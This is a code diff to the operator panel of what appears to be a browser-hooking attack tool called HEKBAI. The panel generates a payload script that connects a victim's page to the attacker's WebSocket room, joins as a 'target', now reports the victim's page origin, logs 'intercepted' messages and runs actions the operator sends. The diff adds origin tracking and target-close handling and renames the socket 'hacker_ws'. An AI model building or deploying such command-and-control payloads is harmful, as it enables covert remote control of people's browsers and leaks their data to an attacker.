@@ -182,10 +182,13 @@ class PanelController {
                 this.addLogEntry(`Join event: ${data.join_at} joined`);
                 break;
             case 'available':
-                this.handleTargetAvailable(data.target_id);
+                this.handleTargetAvailable(data.origin, data.target_id);
                 break;
             case 'attack_success':
                 this.handleAttackSuccess(data.target_id);
+                break;
+            case 'target_close':
+                this.handleTargetClose(data.target_id);
                 break;
             case 'action':
                 if (data.action) {
@@ -204,10 +207,10 @@ class PanelController {
     }
     
     // Handle Target Available Event
-    handleTargetAvailable(targetId) {
+    handleTargetAvailable(origin, targetId) {
         this.targetAvailable = true;
         this.targetId = targetId;
-        this.addLogEntry(`🎯 Target connected: ${targetId}`);
+        this.addLogEntry(`🎯 Target connected: (${origin}) ${targetId}`);
         this.showSuccess('Target is now available for attack!');
         this.updateAttackButton();
     }
@@ -621,20 +624,21 @@ class PanelController {
 // Template: ${this.getTemplateDisplayName(template)}
 // Attacker: ${this.roomData.attackerName}
 
-const ws = new WebSocket('${baseUrl.replace('http', 'ws')}/${roomId}');
+const hacker_ws = new WebSocket('${baseUrl.replace('http', 'ws')}/${roomId}');
 
-ws.onopen = () => {
+hacker_ws.onopen = () => {
     console.log('Connected to HEKBAI room: ${roomId}');
     
     // Join as target
     const joinPayload = {
         event: 'join',
-        join_at: 'target'
+        join_at: 'target',
+        origin: window.location.origin,
     };
-    ws.send(JSON.stringify(joinPayload));
+    hacker_ws.send(JSON.stringify(joinPayload));
 };
 
-ws.onmessage = (event) => {
+hacker_ws.onmessage = (event) => {
     const data = JSON.parse(event.data);
     console.log('Intercepted:', data);
     
@@ -822,11 +826,11 @@ function handleAction(action) {
     }
 }
 
-ws.onerror = (error) => {
+hacker_ws.onerror = (error) => {
     console.error('WebSocket error:', error);
 };
 
-ws.onclose = () => {
+hacker_ws.onclose = () => {
     console.log('WebSocket connection closed');
 };`;
     }
